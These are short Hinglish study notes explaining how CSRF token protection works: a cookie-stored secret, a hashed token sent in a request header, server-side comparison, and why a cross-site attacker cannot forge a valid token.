==============================
CSRF Internal Working (Notes)
==============================

1️⃣ Server First Step

- Server ek random "secret" generate karta hai.
- Ye secret browser ki cookie me store kiya jata hai.
- Ye secret client ko directly expose nahi kiya jata for usage.
- Example:

    csrfSecret = a9x82kLmQp   (stored in cookie)


2️⃣ Token Generation

- Server isi secret se ek CSRF token generate karta hai.
- Token usually secret ka hash hota hai (same algorithm use hota hai).
- Example:

    token = hash(csrfSecret)
    token = XyZ123

- Ye token frontend ko response me send kiya jata hai.


3️⃣ Frontend Responsibility

- Frontend token ko memory/state me store karta hai.
- Jab bhi POST / PUT / PATCH / DELETE request bheji jati hai,
  to ye token header ya body me attach kiya jata hai.

Example:

    Headers:
    X-CSRF-Token: XyZ123


4️⃣ Request Time Flow

Jab client request bhejta hai:

- Browser automatically cookie bhej deta hai:
      csrfSecret = a9x82kLmQp

- Frontend manually (code ke through) token bhejta hai:
      X-CSRF-Token: XyZ123


5️⃣ Server Verification Process

Server ke paas ab 2 cheezein hoti hain:

A. Cookie se secret:
      a9x82kLmQp

B. Header se token:
      XyZ123

Server internally:

    expectedToken = hash(csrfSecret)

Phir compare karta hai:

    expectedToken === tokenFromFrontend

✔ Agar match hua → Request Allowed
❌ Agar match nahi hua → 403 CSRF Error


6️⃣ Hacker Fail Kyun Hota Hai?

- Hacker victim ke browser ki cookie read nahi kar sakta (Same-Origin Policy).
- Isliye usko csrfSecret nahi pata hota.
- Secret ke bina valid token generate nahi kar sakta.
- Result → Token mismatch → Request rejected.


